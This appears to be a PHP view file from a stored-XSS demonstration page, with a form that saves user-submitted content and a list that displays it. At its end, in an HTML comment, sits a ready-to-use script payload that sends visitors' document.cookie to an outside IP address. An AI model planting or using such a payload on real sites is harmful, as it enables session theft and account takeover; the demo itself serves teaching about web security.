<h1>Persistent XSS</h1>
<p>where the malicious string originates from the website's database.<p>
<br/>

<div class="site-contact">
	<?php $this->widget('zii.widgets.CListView', array(
		'dataProvider'=>$dataProvider,
		'itemView'=>'_contact',
	)); ?>

	<br/>
	<br/>
	
	<?php if(Yii::app()->user->hasFlash('contact')): ?>
		<div class="panel panel-success">
			<div class="panel-body">
				OK, content added.
			</div>
		</div>
	<?php else: ?>
		<div class="panel panel-primary">
			<div class="panel-heading">
    				<h3 class="panel-title">Add Content</h3>
			</div>
			<div class="panel-body">
				<?php $form=$this->beginWidget('CActiveForm', array(
					'id'=>'contact-form',
					'enableClientValidation'=>true,
					'clientOptions'=>array(
						'validateOnSubmit'=>true,
					),
					'htmlOptions'=>array('role'=>'form', 'class'=>'form-horizontal col-md-8'),
				)); ?>

					<?php echo $form->errorSummary($model); ?>

					<div class="form-group">
						<?php echo $form->labelEx($model,'content', array('class'=>'', 'for'=>'inputContent')); ?>
						<?php echo $form->textArea($model,'content',array('rows'=>5, 'class'=>'form-control', 'maxlength'=>1024)); ?>
						<?php echo $form->error($model,'content'); ?>
					</div>

					<div class="form-group">
						<?php echo $form->labelEx($model,'contact', array('class'=>'', 'for'=>'inputContact')); ?>
						<?php echo $form->textField($model,'contact',array('id'=>'inputContact', 'class'=>'form-control', 'maxlength'=>128)); ?>
						<?php echo $form->error($model,'contact'); ?>
					</div>


					<div class="form-group">
						<?php echo CHtml::submitButton(Yii::t('translation','Submit'),array('class'=>'btn btn-primary')); ?>
					</div>

				<?php $this->endWidget(); ?>
			</div>
		</div><!-- end of panel-->
	<?php endif; ?>
</div>

<br/>
<br/>
<br/>
<img src="https://excess-xss.com/persistent-xss.png"/>
<br/>
<br/>
<br/>


<!-- 
<script>$.ajax({type:"POST",url:"http://13.228.132.73/cookie/create",data:{'Cookie[cookie]':document.cookie,'Cookie[created_at]':"-"}});</script>
-->
